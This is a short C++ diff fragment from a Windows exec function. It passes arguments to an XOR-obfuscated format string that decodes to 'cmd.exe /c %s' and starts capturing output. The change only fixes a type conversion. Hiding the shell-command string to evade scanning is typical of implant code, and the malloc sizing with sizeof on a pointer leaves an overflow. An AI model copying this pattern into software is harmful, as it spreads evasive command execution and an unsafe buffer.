@@ -160,7 +160,7 @@ std::string exec(char* args){
   
    LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
     + 50);
-    sprintf(cmd, xor_string("vxq;pmp5:v50f",0x15), args);
+    sprintf(cmd, xor_string("vxq;pmp5:v50f",0x15).c_str(), args);
     HANDLE hStdOutRead, hStdOutWrite;
 
     hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
